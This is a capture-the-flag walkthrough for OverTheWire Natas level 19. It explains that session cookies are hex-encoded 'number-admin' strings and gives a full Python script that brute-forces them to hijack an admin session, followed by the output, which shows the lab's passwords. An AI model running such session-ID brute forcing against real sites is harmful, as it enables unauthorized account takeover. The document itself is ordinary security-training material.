# Natas Level 19

> Username: natas19

> Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

> URL: http://natas19.natas.labs.overthewire.org

## Solution

Entering the URL, we found a login page and we don't have a source code to look at. 
But we have: `This page uses mostly the same code as the previous level, but session IDs are no longer sequential...`

So let's try to enter as `admin` in the username and look for the cookie, by Inspecting the page -> Application -> Cookie.

And we found something like `3136302d61646d696e`, this numbers looks like a hexadecimal encoding. We have to decode it to find out.

```shell
echo "3136302d61646d696e" | xxd -r -p
```

```text
160-admin 
```

This tells us that the session ID isn't completely random. It's hex-encoded data, and the decoded value contains a number and a username (number-username), the thing that change is only the first sixth numbers in the Session ID. 
So This is the same vulnerability as the previous level `Session Hijacking through Predictable Session IDs`.

So let's write a script to exploit it.

```python
import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

session = requests.Session()
session.auth = auth

for number in range(1, 640 + 1):

    # Build the predictable session ID
    plaintext = f"{number}-admin"

    # Convert it to hexadecimal
    session_id = plaintext.encode().hex()

    response = session.get(
        url,
        cookies={"PHPSESSID": session_id},
        timeout=10
    )

    print(f"Trying: {plaintext} -> {session_id}")

    if "You are an admin" in response.text:
        print("\nADMIN SESSION FOUND!")
        print("Session ID:", session_id)
        print(response.text)
        break

else:
    print("No admin session found.")
```

Running it and wait for seconds you will have something like:

```html
ADMIN SESSION FOUND!
Session ID: 3238312d61646d696e
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao</pre></div>
</body>
</html>
```

```text
slOKYGsjlJhaqKliGvrgWAzln0JyrWao
```

